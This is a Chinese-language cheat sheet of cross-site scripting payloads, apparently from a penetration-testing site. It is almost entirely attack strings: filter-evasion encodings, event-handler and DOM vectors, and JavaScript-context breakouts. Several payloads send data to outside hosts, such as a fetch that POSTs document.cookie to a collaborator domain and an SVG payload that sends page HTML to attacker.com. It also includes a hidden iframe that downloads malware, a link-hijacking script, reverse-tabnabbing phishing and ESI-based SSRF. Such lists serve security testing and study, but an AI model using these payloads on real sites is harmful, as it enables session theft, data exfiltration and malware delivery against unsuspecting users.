## Payload

### HTML XSS

常见Payload

```javascript
//基本
<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
"><script>alert('XSS')</script>
"><script>alert(String.fromCharCode(88,83,83))</script>
<script>\u0061lert('22')</script>
<script>eval('\x61lert(\'33\')')</script>
<script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt("confirm",30) == 8680439 && 8680439..toString(30) == "confirm"
<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">
<A/hREf="j%0aavas%09cript%0a:%09con%0afirm%0d``">z
<d3"<"/onclick="1>[confirm``]"<">z
<d3/onmouseenter=[2].find(confirm)>z
<details open ontoggle=confirm()>
<script y="><">/*<script* */prompt()</script
<w="/x="y>"/ondblclick=`<`[confir\u006d``]>z
<a href="javascript%26colon;alert(1)">click
<a href=javas&#99;ript:alert(1)>click
<script/"<a"/src=data:=".<a,[8].some(confirm)>
<svg/x=">"/onload=confirm()//
<--`<img/src=` onerror=confirm``> --!>
<svg%0Aonload=%09((pro\u006dpt))()//
<sCript x>(((confirm)))``</scRipt x>
<svg </onload ="1> (_=prompt,_(1)) "">
<!--><script src=//ghostwolflab.com>
<embed src=//ghostwolflab.com>
<script x=">" src=//ghostwolflab.com></script>
<!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>
<iframe/src \/\/onload = prompt(1)
<x oncut=alert()>x
<svg onload=write()>

'';!--"<XSS>=&{()}
<script>+-+-1-+-+alert(1)</script>
<script>+-+-1-+-+alert(/xss/)</script>
%3Cscript%3Ealert(0)%3C%2Fscript%3E
%253Cscript%253Ealert(0)%253C%252Fscript%253E
<svg onload=alert(1)>
"><svg onload=alert(1)>
<iframe src="javascript:alert(1)">
"><script src=data:&comma;alert(1)//
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
%5B'-alert(document.cookie)-'%5D

//img
<img src=x onerror=alert('XSS');>
<img src=x onerror=alert('XSS')//
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
<img src=x:alert(alt) onerror=eval(src) alt=xss>
"><img src=x onerror=alert('XSS');>
"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
<><img src=1 onerror=alert(1)>

//svg
<svgonload=alert(1)>
<svg/onload=alert('XSS')>
<svg onload=alert(1)//
<svg/onload=alert(String.fromCharCode(88,83,83))>
<svg id=alert(1) onload=eval(id)>
"><svg/onload=alert(String.fromCharCode(88,83,83))>
"><svg/onload=alert(/XSS/)
<svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)
<svg><script>alert('33')
<svg><script>alert&lpar;'33'&rpar;

//div
<div onpointerover="alert(45)">MOVE HERE</div>
<div onpointerdown="alert(45)">MOVE HERE</div>
<div onpointerenter="alert(45)">MOVE HERE</div>
<div onpointerleave="alert(45)">MOVE HERE</div>
<div onpointermove="alert(45)">MOVE HERE</div>
<div onpointerout="alert(45)">MOVE HERE</div>
<div onpointerup="alert(45)">MOVE HERE</div>

//char code
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>

//输入已在标签之中
@domain.com">user+'-alert`1`-'@domain.com

//无script标签
<link rel=icon href="//ghostwolflab.com?
<iframe src="//ghostwolflab.com?
<iframe src="//ghostwolflab.com?
<input type=hidden type=image src="//ghostwolflab.com?

//未关闭的标签
<svg onload=alert(1)//
```

HTML5

```javascript
<body onload=alert(/XSS/.source)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video/poster/onerror=alert(1)>
<video><source onerror="javascript:alert(1)">
<video src=_ onloadstart="alert(1)">
<details/open/ontoggle="alert`1`">
<audio src onloadstart=alert(1)>
<marquee onstart=alert(1)>
<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>

<body ontouchstart=alert(1)> //光标触摸屏幕
<body ontouchend=alert(1)>   //光标离开屏幕
<body ontouchmove=alert(1)>  //光标在屏幕上拖动
```

组合键

```javascript
<input type="hidden" accesskey="X" onclick="alert(1)">
// 当用户按下ALT+SHIFT+X或ALT+X组合键时触发
```

大写

```javascript
<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>
```

DOM XSS

```javascript
#"><img src=/ onerror=alert(2)>
<img src=1 onerror=alert(1)>
<iframe src=javascript:alert(1)>
<details open ontoggle=alert(1)>
<svg><svg onload=alert(1)>
data:text/html,<img src=1 onerror=alert(1)>
data:text/html,<iframe src=javascript:alert(1)>
<iframe src=TARGET_URL onload="frames[0].postMessage('INJECTION','*')">
"><svg onload=alert(1)>
javascript:alert(document.cookie)
\"-alert(1)}//
```

JS上下文

```javascript
-(confirm)(document.domain)//
; alert(1);//

//内部JS脚本
</script><img src=1 onerror=alert(document.domain)>
</script><script>alert(1)</script>

//JS文字脚本内部
'-alert(document.domain)-'
';alert(document.domain)//
'-alert(1)-'

//JS内部转义特殊字符
\';alert(document.domain)//
\\';alert(document.domain)//
\'-alert(1)//

//JS内部一些字符被阻止
onerror=alert;throw 1
/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27

//包含在{}内部
${alert(document.domain)}
${alert(1)}
`${alert(1)}`
`${`${`${`${alert(1)}`}`}`}`
```

### 上下文打破

```javascript
<svg onload=alert()>
</tag><svg onload=alert()>
"><svg onload=alert()>
"><svg onload=alert()><b attr="
" onmouseover=alert() "
"onmouseover=alert()//
"autofocus/onfocus="alert()
'-alert()-'
'-alert()//'
'}alert(1);{'
'}%0Aalert(1);%0A{'
</script><svg onload=alert()>
```

### JavaScript包和数据URI中的XSS

JavaScript XSS:

```javascript
javascript:prompt(1)

%26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2399%26%23111%26%23110%26%23102%26%23105%26%23114%26%23109%26%2340%26%2349%26%2341

&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#99&#111&#110&#102&#105&#114&#109&#40&#49&#41

\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)
\152\141\166\141\163\143\162\151\160\164\072alert(1)

java%0ascript:alert(1)   - LF (\n)
java%09script:alert(1)   - Horizontal tab (\t)
java%0dscript:alert(1)   - CR (\r)

\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)

javascript://%0Aalert(1)
javascript://anything%0D%0A%0D%0Awindow.alert(1)
```

带有数据的XSS:

```javascript
data:text/html,<script>alert(0)</script>
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```

vbscript(IE):

```javascript
vbscript:msgbox("XSS")
```


### 跨域资源共享

```javascript
<script>
  fetch('https://<SESSION>.burpcollaborator.net', {
  method: 'POST',
  mode: 'no-cors',
  body: document.cookie
  });
</script>
```

### 控制台显示消息

```javascript
<script>console.log("XSS!\n".concat(document.domain).concat("\n").concat(window.origin))</script>
```

### 窃取源代码

```javascript
<svg/onload="(new Image()).src='//attacker.com/'%2Bdocument.documentElement.innerHTML">
```

### 自定义标签

```javascript
/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x
```

### XSS下载文件

```javascript
<iframe src="http://攻击者主机地址/恶意软件" height="0" width="0"></iframe>
```

### PostMessage XSS

```javascript
<html>
<body>
    <input type=button value="Click Me" id="btn">
</body>

<script>
document.getElementById('btn').onclick = function(e){
    window.poc = window.open('http://www.redacted.com/#login');
    setTimeout(function(){
        window.poc.postMessage(
            {
                "sender": "accounts",
                "url": "javascript:confirm('XSS')",
            },
            '*'
        );
    }, 2000);
}
</script>
</html>
```

### 变异XSS

```javascript
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

### 替换所有链接

```javascript
Array.from(document.getElementsByTagName("a")).forEach(function(i) {
  i.href = "https://attacker.com";
});
```

### 标签内创建属性

```javascript
" autofocus onfocus=alert(document.domain) x="
" onfocus=alert(1) id=x tabindex=0 style=display:block>#x #Access http://ghostwolflab.com/?#x t
<p style="animation: x;" onanimationstart="alert()">XSS</p>
<p style="animation: x;" onanimationend="alert()">XSS</p>

<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>

<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"></div>
```

### 属性内的特殊协议

```javascript
javascript:alert(1)
JavaSCript:alert(1)
javascript:%61%6c%65%72%74%28%31%29
javascript&colon;alert(1)
javascript&#x003A;alert(1)
javascript&#58;alert(1)
&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3aalert(1)

data:text/html,<script>alert(1)</script>
DaTa:text/html,<script>alert(1)</script>
data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
data:text/html;charset=UTF-8,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg
data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==
```

注入协议
```javascript
<a href="javascript:alert(1)">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>

<object data="data:text/html,<script>alert(5)</script>">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
<iframe src="data:text/html,<script>alert(5)</script>"></iframe>

<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf
<embed code="//hacker.site/xss.swf" allowscriptaccess=always> //https://github.com/evilcos/xss.swf
<iframe srcdoc="<svg onload=alert(4);>">
```

### 反向标签抓取

在攻击者可以通过受害者将要单击的属性来控制标签的参数情况下，攻击者将href链接指向控制的恶意网站，一旦受害者点击链接并访问恶意网站，该恶意网站就会通过JavaSripte对象控制原始页面.

常规方法是将原始URL链接更改为windows.opener.location = http://ghostwolflab.com/evil.html. 攻击者控制的恶意网站与原始URL链接内容相似，这样就可以模仿原始URL链接的表单向用户请求登录凭据.

### 访问隐藏内容

即使某些值从JS中消失，仍然可以在不同对象的JS属性中找到.例如，在删除正则表达式的输入值后，仍然可以找到正则表达式的输入：

```javascript
//使用flag执行正则表达式
flag="CTF{FLAG}"
re=/./g
re.test(flag);

//移除flag值
flag=""

//访问之前的正则表达式输入
console.log(RegExp.input)
console.log(RegExp.rightContext)
console.log(document.all["0"]["ownerDocument"]["defaultView"]["RegExp"]["rightContext"])
```

### XSS --> SSRF

```javascript
<esi:include src="http://ghostwolflab.com/capture" />
```
